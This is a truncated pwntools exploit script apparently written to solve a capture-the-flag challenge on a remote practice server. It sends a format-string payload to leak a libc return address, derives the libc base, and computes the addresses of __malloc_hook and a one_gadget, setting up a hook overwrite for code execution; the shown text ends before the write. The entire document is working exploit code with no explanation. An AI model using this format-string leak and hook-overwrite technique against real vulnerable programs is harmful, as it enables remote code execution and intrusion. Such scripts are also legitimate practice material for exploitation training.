from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28131)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.27.so')
libc_start_main_ret = 0x21b97
    
    
offset = 8
io.sendline('%43$p,%42$p')
libc_base = int(io.recvuntil(',', drop=True) ,16) - libc_start_main_ret
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget  = libc_base + 0x10a38c
